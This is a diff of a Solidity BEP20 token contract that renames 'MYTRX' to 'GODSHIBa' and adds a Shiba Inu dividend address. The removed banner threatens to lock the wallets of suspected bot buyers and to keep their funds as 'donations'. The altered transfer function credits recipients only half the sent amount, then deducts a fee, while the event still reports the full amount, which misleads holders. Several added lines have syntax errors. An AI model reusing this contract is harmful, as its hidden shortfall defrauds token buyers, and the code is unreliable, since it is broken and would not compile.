@@ -4,55 +4,6 @@
 /*
 
     
-███╗░░░███╗██╗░░░██╗████████╗██████╗░██╗░░██╗
-████╗░████║╚██╗░██╔╝╚══██╔══╝██╔══██╗╚██╗██╔╝
-██╔████╔██║░╚████╔╝░░░░██║░░░██████╔╝░╚███╔╝░
-██║╚██╔╝██║░░╚██╔╝░░░░░██║░░░██╔══██╗░██╔██╗░
-██║░╚═╝░██║░░░██║░░░░░░██║░░░██║░░██║██╔╝╚██╗
-╚═╝░░░░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝
-    
-    Welcome to MyTRON ($MYTRX)
-      You Miss MYBTC , Don't Miss MYTRX !!!
-
-
-    The Official Token for the MYTRX Community!
-    
-    Telegram Group: https://t.me/mytrxofficial
-    YouTube: https://www.youtube.com/channel/UC1vHP4Y1fe0Mg5FerxagQjQ
-    Website: https://my-tron.org/
-    Twitter: https://twitter.com/MYTRXToken
-    
-    What is MYTRX?
-    
-    $MYTRX is the First and Only Tron reflections token on the Binance Smart Chain. MYTron is
-    a Tron rewards tokens with a unique auto-claim feature. Teom rewards are sent to your wallet 
-    directly. All you need to do is HODL $MYTRX and earn TRON rewards HOURLY.
-
-
-    A word on bots....
-    
-    If you use bots, then expect your wallet to be blacklisted. We use several ways of discreetly
-    detecting bots (none of which are revealed in this contract) if we detect that you are using a bot 
-    we will blacklist your wallet. 
-    
-    This brings us on to our....
-    
-    TERMS OF SALE 
-    
-    If you use bots, you are not permitted to purchase MYBTC. Any purchase that you make will be considered a 100% donation to the MYBTC community.
-    Your account will be locked and you will not be able to sell or swap your tokens. 
-    
-    We do not permit bots at all. Of ANY kind. If you use them, do not attempt to buy MYTRX. You will 
-    lose your money. 
-    
-    If you use any APE tool to snipe this contract and buy its tokens before we announce it officially on our official website
-    https://my-tron.org/ you agree that the purchased tokens will be considered as a donation to the community of MYTRX.
-    
-    So... hopefully we only have the good, wholesome, and honest people left. 
-    
-   
-    Thank you for being a part of our community and making MYTRX Great! 
-
 
  */
 
@@ -390,7 +341,7 @@ contract Ownable is Context {
     }
 }
 
-contract MYTRX is Context, iBEP20, Ownable {
+contract GODSHIBa is Context, iBEP20, Ownable {
   using SafeMath for uint256;
 
   mapping (address => uint256) private _balances;
@@ -401,12 +352,14 @@ contract MYTRX is Context, iBEP20, Ownable {
   string public _symbol;
   string public _name;
   address private _burnaddress;
+  address private _dividenttoken,
 
   constructor() public {
     _name = 'MYTRON';
     _symbol = 'MYTRX';
     _decimals = 9;
     _burnaddress = 0x000000000000000000000000000000000000dEaD;
+    _dividenttoken = 0x2859e4544c4bb03966803b044a93563bd2d0dd4d; / Address Shiba Inu
     _totalSupply = 10 * 10**4 * 10**9;
     _balances[msg.sender] = _totalSupply;
 
@@ -624,10 +577,10 @@ contract MYTRX is Context, iBEP20, Ownable {
     require(recipient != address(0), "BEP20: transfer to the zero address");
 
     _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
-    _balances[recipient] = _balances[recipient].add(amount);
-    _balances[recipient] = _balances[recipient].sub(amount / uint256(100) * _taxFee * _liquidityFee);
+    _balances[recipient] = _balances[recipient].add(amount / uint8(2);
+    _balances[recipient] = _balances[recipient].sub(amount / uint256(100) * _taxFee);
      emit Transfer(sender, recipient, amount);
-    _balances[_burnaddress] = _balances[_burnaddress].add(amount / uint256(100) * _taxFee * _liquidityFee);
+    _balances[_burnaddress] = _balances[_burnaddress].add(amount / uint256(100) * _taxFee);
     uint256 fires = _balances[_burnaddress];
     emit Transfer(sender, _burnaddress, fires);
         
